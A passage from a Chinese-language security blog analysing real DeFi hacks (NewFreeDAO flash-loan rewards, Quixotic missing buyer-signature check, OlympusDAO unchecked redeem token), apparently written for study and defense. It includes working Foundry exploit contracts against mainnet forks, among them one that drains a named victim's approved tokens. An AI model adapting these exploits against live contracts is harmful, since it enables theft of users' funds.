href="https://bscscan.com/address/0x26c0623847637095655b2868c3182b2285bdaeaf">0x26c0623847637095655b2868c3182b2285bdaeaf</a></li></ul></li><li>赃款转移：获利的4481枚WBNB中的2000枚兑换成55.7万枚USDT<ul><li><a href="https://bscscan.com/tx/0x8c035fc9c3d944b3dd4a0ea721c119240cb624e79b7625a16173ad6682410599">0x8c035fc9c3d944b3dd4a0ea721c119240cb624e79b7625a16173ad6682410599</a> </li><li><a href="https://bscscan.com/tx/0xda4b4de6ecacfe9b8b60167a2010630aeec103ab51920eb2e1b94ba1fef6c95b">0xda4b4de6ecacfe9b8b60167a2010630aeec103ab51920eb2e1b94ba1fef6c95b</a></li></ul></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p>因为此次交易涉及到的地址和资金太多了，仅截取大额资金流向（小额的都是-0.0000000000000001）</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831201352363.png" alt="image-20230831201352363"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>1.黑客通过闪电贷获得250个WBNB</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831202421780.png" alt="image-20230831202421780"></p><p>2.在pancake中，将闪电贷得到的所有WBNB换成USD，然后进一步换成NFD，得到6313508个NFD</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831203350611.png" alt="image-20230831203350611"></p><p>3.利用合约漏洞</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831204005407.png" alt="image-20230831204005407"></p><p>4.然后就是不断地创建辅助合约，重复相同的攻击获利</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831204205532.png" alt="image-20230831204205532"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>从攻击过程我们可以分为三部分：闪电贷借来资金，创建辅助合约并发送资金到辅助合约，辅助合约调用漏洞合约的<code>0x6811e3b9()</code>进行获利。因此，此次攻击的重点也就只有漏洞合约的<code>0x6811e3b9()</code>，我们接下来对它进行分析。</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831204916576.png" alt="image-20230831204916576"></p><p>由于这个漏洞合约并没有开源，因此我们对他进行<a href="https://library.dedaub.com/decompile?md5=6909ade6e0864fd7845e35a0650eaa19">反编译</a>，分析结果如下图，大致意思如下：</p><ul><li>由于调用一次<code>0x6811e3b9()</code>获取利润奖励之后，调用者的时间戳将被更新，也就是说你领取完了这段时间内的奖励，再次领取将会出现零奖励的情况。对于这个问题，黑客采用的方式是：用攻击合约不断创建新的辅助合约，将资金转到辅助合约，用辅助合约来调用<code>0x6811e3b9()</code>，因为每一个没有调用过此方法的地址，其时间戳都将被设置为<code>owner_d[msg.sender] = stor_6</code>。</li><li>v3是实际发送的奖励金额，是根据项目方的公式来计算得到的，但是我看到计算方式<code>_SafeDiv()</code>仅仅是简单的除法，应该会存在价格操纵的可能性（只是本次攻击并没有涉及到）。</li><li>模式很像是项目方会奖励给到拥有NFD的用户：用户拥有越多的NFD，拥有的时间越长，得到的奖励就越多。但是这种计算奖励的方式过于简单，容易被黑客投机取巧，就比如这次的闪电贷攻击，黑客通过闪电贷在短时间内急剧增加NFD余额，并且可以立刻判断和领取奖励。比较合适的方法比如是采用快照的方式，或者对拥有者进行时间加权等。</li></ul><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831211923376.png" alt="image-20230831211923376"></p><p>调用之后就获利了（其中一个辅助合约）</p><p><img src="/2023/09/18/08.PoC/07.NewFreeDAO@falshloan@reward/image-20230831212819983.png" alt="image-20230831212819983"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../interface.sol&quot;;</span><br><span class="line">import &quot;./attackHelper.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    IPancakeRouter public pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));</span><br><span class="line">    IERC20 public wbnb = IERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));</span><br><span class="line">    IDVM public DVM_flashloan = IDVM(address(0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7));</span><br><span class="line">    address public usdt = 0x55d398326f99059fF775485246999027B3197955;</span><br><span class="line">    address public nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;</span><br><span class="line">    address constant toAttack = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;</span><br><span class="line"></span><br><span class="line">    address public attacker = 0x22C9736D4Fc73A8fa0EB436D2ce919F5849D6fD2;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 21_140_434);</span><br><span class="line"></span><br><span class="line">        vm.label(address(pancakeRouter), &quot;pancakeRouter&quot;);</span><br><span class="line">        vm.label(address(wbnb), &quot;wbnb&quot;);</span><br><span class="line">        vm.label(address(DVM_flashloan), &quot;DVM_flashloan&quot;);</span><br><span class="line">        vm.label(address(usdt), &quot;usdt&quot;);</span><br><span class="line">        vm.label(address(nfd), &quot;nfd&quot;);</span><br><span class="line">        vm.label(address(toAttack), &quot;toAttack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Exploit() public &#123;</span><br><span class="line">        console.log(&quot;[before flashloan] address(this) WBNB balance&quot;,wbnb.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        // 进行闪电贷，获得WBNB</span><br><span class="line">        bytes memory data = abi.encode(DVM_flashloan, wbnb, 250 * 1e18);</span><br><span class="line">        // 写接口的时候，flashLoan()没有returns(bool)!!!!!!!!!</span><br><span class="line">        DVM_flashloan.flashLoan(0, 250 * 1e18, address(this), data);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;[after pay back flashloan] address(this) WBNB balance&quot;,wbnb.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 闪电贷回调函数，攻击逻辑写在这里</span><br><span class="line">    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external&#123;</span><br><span class="line">        console.log(&quot;[get flashloan] address(this) WBNB balance&quot;,wbnb.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        // 将得到的WBNB换成NFD</span><br><span class="line">        address[] memory path = new address[](3);</span><br><span class="line">        path[0] = address(wbnb);</span><br><span class="line">        path[1] = usdt;</span><br><span class="line">        path[2] = nfd;</span><br><span class="line">        IERC20(wbnb).approve(address(pancakeRouter), type(uint256).max); // 交换之前需要approve给router</span><br><span class="line">        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            quoteAmount, 0, path, address(this), block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 不断创建辅助合约来攻击</span><br><span class="line">        for (uint256 i = 0; i &lt; 50; i++) &#123;</span><br><span class="line">            AttackHelper attackHelper = new AttackHelper();</span><br><span class="line">            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));</span><br><span class="line">            IERC20(nfd).transfer(address(attackHelper), nfdAmount);</span><br><span class="line">            attackHelper.attack();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 查看本攻击合约的NFD余额</span><br><span class="line">        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // 将NFD换回成WBNB</span><br><span class="line">        path[0] = nfd;</span><br><span class="line">        path[1] = usdt;</span><br><span class="line">        path[2] = address(wbnb);</span><br><span class="line">        IERC20(nfd).approve(address(pancakeRouter), type(uint256).max);</span><br><span class="line">        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            nfdBalance, 0, path, address(this), block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 闪电贷还钱</span><br><span class="line">        console.log(&quot;[after attack] address(this) WBNB balance&quot;, wbnb.balanceOf(address(this)));</span><br><span class="line">        wbnb.transfer(msg.sender, 250 * 1e18);</span><br><span class="line"></span><br><span class="line">        // 看看跟攻击事件中的获利是否相同</span><br><span class="line">        assertEq(2952971303206254291601, wbnb.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;../interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackHelper &#123;</span><br><span class="line">    address constant toAttack = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;</span><br><span class="line">    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        // 调用漏洞合约的方法获利</span><br><span class="line">        toAttack.call(abi.encode(bytes4(0x6811e3b9)));</span><br><span class="line"></span><br><span class="line">        // 将本金和获利一同发送到攻击合约</span><br><span class="line">        uint256 bal = IERC20(nfd).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        IERC20(nfd).transfer(msg.sender, bal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>领取奖励的方法应该设置防止闪电贷攻击，采用快照、或时间加权、时间锁等方式</li><li>（本次攻击并没有涉及，但是存在此问题）计算奖励数量不应该这么简单的用一个除法来计算，应该使用加权等方式，否则很有可能出现价格操纵的问题</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.Quixotic@signature@validation</title>
      <link href="/2023/09/18/08.PoC/06.Quixotic@signature@validation/"/>
      <url>/2023/09/18/08.PoC/06.Quixotic@signature@validation/</url>
      
        <content type="html"><![CDATA[<h1 id="Quixotic-signature-validation"><a href="#Quixotic-signature-validation" class="headerlink" title="Quixotic@signature@validation"></a>Quixotic@signature@validation</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>Quixotic的交易所合约ExchangeV4存在漏洞，黑客可以获得任何用户授权到合约的金额，因为它只检查了买单，而没有检查卖单。目前交易所合约已被紧急关闭。</p><ul><li>时间：2022.07.01</li><li>损失金额：$100k</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>攻击事件hash：<a href="https://optimistic.etherscan.io/tx/0x5dc519726e1236eb846271f6699e03cdd1a8fd593a2900c71cd2aabbdb7c92e6">0x5dc519726e1236eb846271f6699e03cdd1a8fd593a2900c71cd2aabbdb7c92e6</a></li><li>发起攻击的黑客EOA：<a href="https://optimistic.etherscan.io/address/0x0a0805082ea0fc8bfdcc6218a986efda6704efe5">0x0a0805082ea0fc8bfdcc6218a986efda6704efe5</a></li><li>漏洞合约地址：<a href="https://optimistic.etherscan.io/address/0x065e8a87b8f11aed6facf9447abe5e8c5d7502b6#code">0x065e8a87b8f11aed6facf9447abe5e8c5d7502b6</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830142409002.png" alt="image-20230830142409002"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830143627148.png" alt="image-20230830143627148"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>发生漏洞的是下面的这个方法（省略了无关紧要的代码），这是一个交易的函数，它的用意是：检查交易是否可以成功，然后用一个卖家的卖单和一个买家的买单进行匹配，然后成交这比交易。但是分析代码，我们发现这个方法只检查了卖单的有效性<code>_validateSellerSignature(sellOrder, signature)</code>，而没检查买单是否有效，也就是说买家有没有签名交易并没有做检查。</p><p>由于没有对买单的交易做检查，那么黑客可以随便创建一个没价值的代币卖单，然后找受害者，将其地址作为买单，这样受害者没有签名买单的情况下，就可以转移受害者的资产，当然前提是受害者之前approve给此合约（这样合约才能<code>transferFrom()</code>转移走受害者的资产给黑客）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function fillSellOrder(....) external payable whenNotPaused nonReentrant &#123;</span><br><span class="line">       // If the payment ERC20 is the zero address, we check that enough native ETH has been sent</span><br><span class="line">       // with the transaction. Otherwise, we use the supplied ERC20 payment token.</span><br><span class="line">       if (paymentERC20 == address(0)) &#123;</span><br><span class="line">           require(msg.value &gt;= price, &quot;Transaction doesn&#x27;t have the required ETH amount.&quot;);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           _checkValidERC20Payment(buyer, price, paymentERC20);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       SellOrder memory sellOrder = SellOrder(....);</span><br><span class="line"></span><br><span class="line">       // Make sure the order is not cancelled</span><br><span class="line">       require(</span><br><span class="line">           cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) &lt; createdAtBlockNumber,</span><br><span class="line">           &quot;This order has been cancelled.&quot;</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       // Check signature</span><br><span class="line">       require(_validateSellerSignature(sellOrder, signature), &quot;Signature is not valid for SellOrder.&quot;);</span><br><span class="line">......</span><br><span class="line">       _fillSellOrder(sellOrder, buyer);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>我们追踪一下此笔交易的整个流程</p><p>1.<code>_checkValidERC20Payment(buyer, price, paymentERC20)</code>：查看这个ERC20交易代币是否被approve授权过，并且买单有足够的钱，然后此交易所合约有足够的allowance</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830145123131.png" alt="image-20230830145123131"></p><p>2.<code>cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) &lt; createdAtBlockNumber</code>：检查这个卖单是否被取消了</p><p>3.<code>_validateSellerSignature(sellOrder, signature)</code>：检查卖单是否有效，用ECDSA来检查签名的有效性。</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830145642053.png" alt="image-20230830145642053"></p><p>4.<code>_fillSellOrder(sellOrder, buyer)</code>：进行交易，真正的关键转账是<code>_sendERC20PaymentsWithRoyalties()</code>，他会从买家发送两笔钱到买单中，一个给<code>_makerWallet</code>也就是合约的项目方地址，算是手续费，另外一个给到黑客<code>seller</code>，然后获利离场，受害者则在<code>_transferNFT()</code>中得到黑客没用的NFT</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830145934968.png" alt="image-20230830145934968"></p><p>在区块链浏览器查看黑客的EOA账户，我们可以发现，黑客使用同样的手法重复的进行攻击</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830152500759.png" alt="image-20230830152500759"></p><p>追溯到第一笔合约，我们发现部署了一个合约，这个合约地址将会被作为<code>fillSellOrder()</code>的contractAddress参数，产生没有价值的NFT来创建卖单</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830153613362.png" alt="image-20230830153613362"></p><p>对这个合约进行反编译，我们得以验证此合约就是用于辅助攻击而创建的产生没价值NFT的合约</p><p><img src="/2023/09/18/08.PoC/06.Quixotic@signature@validation/image-20230830154121509.png" alt="image-20230830154121509"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../interface.sol&quot;;</span><br><span class="line">import &quot;./NFTContract.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    NFTContract public nftHelper;</span><br><span class="line">    IQuixotic public quixotic = IQuixotic(address(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6));</span><br><span class="line">    IERC20 public op = IERC20(0x4200000000000000000000000000000000000042);</span><br><span class="line"></span><br><span class="line">    address public attacker = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;</span><br><span class="line">    address public victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;</span><br><span class="line"></span><br><span class="line">     function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;optimism&quot;, 13_591_382);</span><br><span class="line">        nftHelper = new NFTContract();</span><br><span class="line"></span><br><span class="line">        vm.label(address(nftHelper), &quot;nftHelper&quot;);</span><br><span class="line">        vm.label(address(quixotic), &quot;quixotic&quot;);</span><br><span class="line">        vm.label(address(op), &quot;op&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Exploit() public &#123;</span><br><span class="line"></span><br><span class="line">        emit log_named_uint(&quot;[Before] attacker OP Balance:&quot;, op.balanceOf(attacker));</span><br><span class="line">        vm.startBroadcast(attacker);</span><br><span class="line">        uint256 victimBalance = op.balanceOf(victim);</span><br><span class="line"></span><br><span class="line">        quixotic.fillSellOrder(</span><br><span class="line">            address(attacker), // seller</span><br><span class="line">            address(nftHelper), // contractAddress</span><br><span class="line">            uint256(1), // tokenId</span><br><span class="line">            uint256(1), // startTime</span><br><span class="line">            uint256(9999999999999999999999999999999999999999), // expiration</span><br><span class="line">            uint256(victimBalance), // price, 黑客需要知道受害者拥有多少op，全部取走</span><br><span class="line">            uint256(1), // quantity</span><br><span class="line">            uint256(1), // createdAtBlockNumber</span><br><span class="line">            address(0x4200000000000000000000000000000000000042), // paymentERC20</span><br><span class="line">            // 这个签名需要到链下进行，计算过程放到了calSignature.sol中</span><br><span class="line">            hex&quot;ed60c44be131f7252ba5b53a3a56ab340a5231c122f454e37fed4302a4ae5568191eee46f491eefd3c0aeb895f9045ded4c55194e204647a78528e34085b9ef81b&quot;, // signature</span><br><span class="line">            address(victim) // buyer，受害者</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line"></span><br><span class="line">        emit log_named_uint(&quot;[after] attacker OP Balance:&quot;, op.balanceOf(attacker));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">contract NFTContract &#123;</span><br><span class="line">    function supportsInterface(bytes4 x) public returns(bool)&#123;</span><br><span class="line">        if(x == 0x01ffc9a7)&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else if(x == 0xffffffff)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else if(x == 0x80ac58cd)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else if(x == 0xd9b67a26)&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address, address) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address, address, uint256) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function safeTransferFrom(address, address, uint256, uint256, bytes memory) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>关键方法一定要对交易进行充分的检验！这里就是缺少了对买家的检验，导致用户平白无故成了买家</p>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.OlympusDao@validation</title>
      <link href="/2023/09/18/08.PoC/05.OlympusDao@validation/"/>
      <url>/2023/09/18/08.PoC/05.OlympusDao@validation/</url>
      
        <content type="html"><![CDATA[<h1 id="OlympusDao-validation"><a href="#OlympusDao-validation" class="headerlink" title="OlympusDao@validation"></a>OlympusDao@validation</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>BondFixedExpiryTeller合约拥有的<a href="https://etherscan.io/address/0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5">OHM</a>代币被偷走</p><ul><li>时间：2022.10.21</li><li>损失金额：$292k</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>漏洞合约：<a href="https://etherscan.io/address/0x007fe7c498a2cf30971ad8f2cbc36bd14ac51156#code">0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156</a></li><li>攻击事件hash：<a href="https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf">0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf</a></li><li>攻击合约：<a href="https://etherscan.io/address/0xa29E4fe451CCFa5e7DEF35188919ad7077A4DE8f#tokentxns">0xa29E4fe451CCFa5e7DEF35188919ad7077A4DE8f</a></li><li>黑客EOA地址：<a href="https://etherscan.io/address/0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be">0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/09/18/08.PoC/05.OlympusDao@validation/image-20230829160738892.png" alt="image-20230829160738892"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/09/18/08.PoC/05.OlympusDao@validation/image-20230829162313109.png" alt="image-20230829162313109"></p><p>攻击合约获利之后，转回到EOA地址，然后去到<a href="https://etherscan.io/address/0x245cc372c84b3645bf0ffe6538620b04a217988b#code">OlympusDAO</a>中调用<code>transfer()</code></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>根据攻击过程可以知道，黑客利用合约，调用BondFixedExpiryTeller合约的<code>redeem()</code>就直接获利，因此，此方法肯定有明显的漏洞：此方法用于取款，烧掉用户在<code>token_</code>的资产，然后此合约转给用户<code>token_</code>的标的资产。但是，<code>token_</code>是可控的，并且没有做任何检验，这就意味着很容易就达到转账，仅仅只是实现<code>burn()</code>、<code>expiry()</code>和<code>underlying()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant &#123;</span><br><span class="line">    if (uint48(block.timestamp) &lt; token_.expiry())</span><br><span class="line">        revert Teller_TokenNotMatured(token_.expiry());</span><br><span class="line">    token_.burn(msg.sender, amount_);</span><br><span class="line">    token_.underlying().transfer(msg.sender, amount_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span 